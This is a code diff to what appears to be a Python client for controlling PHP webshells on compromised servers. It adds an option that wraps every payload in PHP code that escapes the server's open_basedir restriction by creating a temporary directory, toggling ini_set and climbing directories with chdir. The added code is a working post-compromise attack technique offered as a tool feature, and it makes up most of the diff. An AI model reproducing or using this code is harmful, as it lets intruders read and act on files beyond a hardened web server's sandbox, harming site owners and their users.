@@ -355,6 +355,14 @@ php_webshell_conn_options = [
         default_value=False,
         alternatives=None,
     ),
+    ConnOption(
+        id="bypass_open_basedir",
+        name="绕过open_basedir",
+        type="checkbox",
+        placeholder="绕过php.ini中的open_basedir限制",
+        default_value=False,
+        alternatives=None,
+    ),
 ]
 
 # TODO: fix string repr, php will parse `$` in quoted strings
@@ -374,6 +382,7 @@ class PHPWebshell(PHPSessionInterface):
         self.sessionize_payload = options.get("sessionize_payload", False)
         self.antireplay = options.get("antireplay", False)
         self.encryption = options.get("encryption", False)
+        self.bypass_open_basedir = options.get("bypass_open_basedir", False)
         # for upload file and download file
         self.chunk_size = 32 * 1024
         self.max_coro = 4
@@ -744,6 +753,53 @@ class PHPWebshell(PHPSessionInterface):
 
         return wrap
 
+    def bypass_opendir_wrapper(
+        self, submitter: t.Callable[[str], t.Awaitable[str]]
+    ) -> t.Callable[[str], t.Awaitable[str]]:
+        @functools.wraps(submitter)
+        async def wrap(payload: str) -> str:
+            return await submitter(
+                """
+            function bypass_open_basedir()
+            {
+                $basedir = @ini_get("open_basedir");
+                if (!$basedir) {
+                    return;
+                }
+                $basedir_arr = preg_split("/;|:/", $basedir);
+                $pwd = @dirname($_SERVER["SCRIPT_FILENAME"]);
+                @array_push($basedir_arr, $pwd, sys_get_temp_dir());
+                foreach ($basedir_arr as $item) {
+                    if (!@is_writable($item)) {
+                        continue;
+                    }
+                    $tmdir = $item . "/." . (rand() % 100000);
+                    if (!(@mkdir($tmdir)) || !@file_exists($tmdir)) {
+                        continue;
+                    }
+                    $tmdir = realpath($tmdir);
+                    @chdir($tmdir);
+                    @ini_set("open_basedir", "..");
+                    $cntarr = @preg_split("/\\\\\\\\|\\//", $tmdir);
+                    for ($i = 0; $i < sizeof($cntarr); $i++) {
+                        @chdir("..");
+                    }
+                    @ini_set("open_basedir", "/");
+                    @rmdir($tmdir);
+                    break;
+                }
+            }
+            bypass_open_basedir();
+            PAYLOAD
+            """.replace(
+                    "    ", ""
+                ).replace(
+                    "PAYLOAD", payload
+                )
+            )
+
+        return wrap
+
     def encryption_wrapper(
         self, submitter: t.Callable[[str], t.Awaitable[str]]
     ) -> t.Callable[[str], t.Awaitable[str]]:
@@ -882,6 +938,8 @@ class PHPWebshell(PHPSessionInterface):
             submitter = self.antireplay_wrapper(submitter)
         if self.encryption:
             submitter = self.encryption_wrapper(submitter)
+        if self.bypass_open_basedir:
+            submitter = self.bypass_opendir_wrapper(submitter)
         return await submitter(payload)
 
     async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
